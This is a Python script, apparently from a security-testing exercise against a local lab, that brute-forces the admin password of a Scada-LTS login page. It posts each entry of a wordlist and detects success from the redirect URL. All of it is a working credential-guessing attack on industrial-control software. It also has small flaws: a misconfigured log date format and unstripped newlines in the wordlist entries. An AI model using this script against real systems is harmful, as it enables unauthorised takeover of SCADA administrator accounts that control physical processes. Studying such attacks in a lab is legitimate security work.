import requests
import logging
from datetime import datetime

HOST = "http://localhost:8080"
URL_ERROR = f"{HOST}/Scada-LTS/login.htm?error"
SUCCESS_LOCATION = f"{HOST}/Scada-LTS/watch_list.shtm"


logging.basicConfig(
    filename="01-broken-access-control.log",
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%(asctime)s - %(levelname)s - %(message)s',
)


def sendLoginRequest(password: str): 
    formData = {
        'username': 'admin',
        'password': password,
    }
    try:
        res = requests.post(f"{HOST}/Scada-LTS/login.htm", data=formData)

        return res
    except Exception as e:
        logging.error(f'[FAILURE] Request failed with password {password}. Error: {e}')

        print(f"[ERROR] Unexpected error {e}")
        
def tryPassword(password: str):
    res = sendLoginRequest(password=password)

    if(res.url == URL_ERROR):
        print('[ERROR] Incorrect password')

        return False

    if (res.url == SUCCESS_LOCATION):
        print('[SUCCESS] Correct password!')

        return True
    
    return False
    
def tryPasswords():
    start_time = datetime.now()
    with open("password-wordlist.txt") as f:
        tries = 0

        for password in f:
            tries += 1

            print(f'[TRYING PASSWORD] {password}')
            result = tryPassword(password=password)

            if result == True:
                end_time = datetime.now()
                print(f'Password found: {password} | Number of tries: {tries}')
                logging.info(f'[INFO]Request succeded with password {password}. Tries: {tries}')
                print(f'[FOUND AT] {end_time.strftime('%Y-%m-%d %H:%M:%S')}')
                print(f'[DURATION] {end_time-start_time}')
                logging.info(f"Duration of found {end_time-start_time}")


                break
    


def main():
    tryPasswords()

if __name__ == '__main__':
    main() 
    